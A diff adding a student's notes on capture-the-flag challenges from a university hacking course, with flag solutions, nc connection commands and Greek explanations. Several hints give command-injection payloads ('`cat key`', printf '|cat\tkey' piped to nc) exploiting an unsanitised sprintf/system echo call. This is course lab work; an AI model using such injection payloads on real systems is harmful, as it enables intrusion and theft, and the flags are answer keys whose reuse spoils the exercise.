@@ -23,3 +23,34 @@ hint: ssh-keygen -t rsa -b 2048
         chmod 600 ~/.ssh/authorized_keys
         ssh dimitriskaragiannis36@shell.hackintro25.di.uoa.gr
 -----------------------------------------------------------------------------------------------
+challenge #Sippy Cup
+solution: 4c7bef92996fc2f463fcefd93749715f
+hint: nc shell.hackintro25.di.uoa.gr 9957
+        uint32_t = 2^32 (μαζί με το 0) = 4.294.967.296
+-----------------------------------------------------------------------------------------------
+challenge # injection 1
+solution: 81207634a1e560c5697ddb8775f73880
+hint: nc shell.hackintro25.di.uoa.gr 16139
+        `ls`           sprintf(cmd, "echo %s", msg);
+                       system(cmd);
+        `cat key`      backtricks σε bash 
+-----------------------------------------------------------------------------------------------
+challenge # Byte Code
+solution: 2310350a51eea9bd
+hint: scp ~/hw1-26-Dimitriskaragiannis36/login.pyc dimitriskaragiannis36@shell.hackintro25.di.uoa.gr:~/
+        610d = Python 3.9
+        https://pylingual.io/ για Decompilation 
+        https://www.programiz.com/python-programming/online-compiler/
+        e06c42c125f01043d1bcf8c1c2b0bf3f
+-----------------------------------------------------------------------------------------------
+challenge # injection 2
+solution: 9c26c16a8498f40d771905ab05b6ad5e
+hint: printf '|ls\t-la\n' | nc shell.hackintro25.di.uoa.gr 14126
+      printf '|cat\tkey\n' | nc shell.hackintro25.di.uoa.gr 14126 ή
+      echo -e "true&&cat\tkey" | nc shell.hackintro25.di.uoa.gr 14126
+                        sprintf(cmd, "echo %s", msg);
+                        system(cmd);
+                        δεν φιλτράρει tab (\t) και Ο server νομίζει ότι τρέχει echo [κείμενο] 
+                        αλλά επειδή το input αρχίζει με |, το shell το διαβάζει ως δύο εντολές 
+                        και όχι ως argument του echo
+-----------------------------------------------------------------------------------------------
